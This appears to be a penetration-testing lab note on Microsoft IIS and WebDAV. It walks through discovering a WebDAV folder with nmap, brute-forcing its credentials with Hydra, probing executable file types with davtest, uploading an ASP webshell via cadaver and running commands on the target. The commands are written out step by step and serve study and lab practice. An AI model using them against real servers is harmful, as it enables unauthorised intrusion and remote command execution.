## Microsoft IIS Overview

- **IIS (Internet Information Services)**: Proprietary web server from Microsoft for Windows NT family.
- Used to host **websites and web applications** with a GUI management interface.
- Supports both **static and dynamic content**:
  - Native: `.asp`, `.aspx`, `.config`
  - Optional: `.php` (if PHP is installed)
- Runs on standard ports: **80 (HTTP)** and **443 (HTTPS)**.

---
## Is IIS like Apache?

- **Yes, in purpose**: Both are **web servers** that serve HTTP content.
- **No, in implementation**:
  - **IIS**: Microsoftâ€™s proprietary server for **Windows**, tightly integrated with ASP.NET, Windows Auth, and services like WebDAV.
  - **Apache**: Open-source, cross-platform, commonly used with PHP on Linux.

---
## WebDAV Overview

- **WebDAV (Web-based Distributed Authoring and Versioning)**: HTTP extension enabling **remote file editing/management**.
- Turns a web server into a **collaborative file server**.
- Runs **on top of IIS** over ports **80/443**.
- **Requires authentication** (username + password) â€” typically Basic or Windows Auth.

---
## WebDAV Exploitation Workflow

### Step 1: Discover WebDAV

```bash
nmap -sV -sC 192.168.1.10
```
â†’ Look for `http` service with WebDAV hints.

Refine with:
```bash
nmap -sV -p 80 --script=http-enum 192.168.1.10
```

â†’ Output example:
```
/webdav/   Potentially interesting folder
```

Visit `http://192.168.1.10/webdav/` â†’ prompts for credentials.

---
### Step 2: Brute-Force Credentials

Use **Hydra** to crack WebDAV auth:
```bash
hydra -L userlist.txt -P passlist.txt 192.168.1.10 http-get /webdav/
```

- `-L`: username wordlist  
- `-P`: password wordlist  
- `http-get`: tells Hydra to test via HTTP GET (standard for Basic Auth)

âœ… Success: e.g., `bob:password_123`

> ðŸ’¡ Hydra supports many protocols (FTP, SSH, RDP, HTTP forms, etc.).

---
### Step 3: Confirm Access & Behavior

After login, browser shows a **list of files** in `/webdav/`.

> â“ Is this directory listing?  
> â†’ Yes â€” if IIS has **directory browsing enabled**, it behaves like an index.  
> â†’ Not all WebDAV servers show this â€” depends on IIS config.

---
### Step 4: Test Upload & Execution Permissions

Use **`davtest`** to probe capabilities:
```bash
davtest -auth bob:password_123 -url http://192.168.1.10/webdav/
```

#### What `davtest` does:

1. Tests basic WebDAV connectivity  
2. Attempts to **create a directory**  
3. Uploads test files (`.txt`, `.php`, `.asp`, etc.)  
4. Checks which file types are **allowed AND executable**

âœ… Example output:
```
INFO: .asp allowed and executable!
```

> ðŸŽ¯ Goal: Find an **executable extension** (e.g., `.asp` on IIS).

---
### Step 5: Upload Webshell via `cadaver`

Interactive WebDAV client:
```bash
cadaver http://192.168.1.10/webdav/
```
- Prompts for credentials â†’ enter `bob:password_123`
- Gives CLI-like interface (`dav:/webdav/>`)

Upload pre-built webshell (Kali includes these):
```bash
put /usr/share/webshells/asp/webshell.asp
```
â†’ File uploaded to `/webdav/webshell.asp`

> ðŸ’¡ Kali path: `/usr/share/webshells/` contains ASP, PHP, JSP shells.

---
### Step 6: Trigger Webshell

Visit in browser:
```
http://192.168.1.10/webdav/webshell.asp
```
â†’ Page loads with **command input field** (e.g., "Run command:")

Enter:
```cmd
whoami
ipconfig
```
â†’ Executes commands as the **IIS application pool user** (often low-priv, but can be escalated).

> ðŸ”¥ You now have **arbitrary command execution** on the Windows target.

---
## Tools Summary

| Tool | Purpose |
|------|--------|
| **`nmap`** | Discover WebDAV via scripts (`http-enum`, `http-webdav`) |
| **`hydra`** | Brute-force WebDAV credentials |
| **`davtest`** | Auto-test upload/exec permissions |
| **`cadaver`** | Interactive file upload/download/edit |

All pre-installed on **Kali Linux**.

---
## Key Notes

- WebDAV is **rare in modern IIS** due to security risks â€” but common in labs.
- **Authentication bypass is unlikely** â€” focus on **credential brute-forcing**.
- **File upload â‰  RCE** unless the server **executes** your file (hence `.asp` on IIS).
- Always check **which extensions execute** â€” `.php` wonâ€™t work unless PHP is installed.

> âœ… WebDAV = **authenticated file upload + execution = full compromise** (if misconfigured).

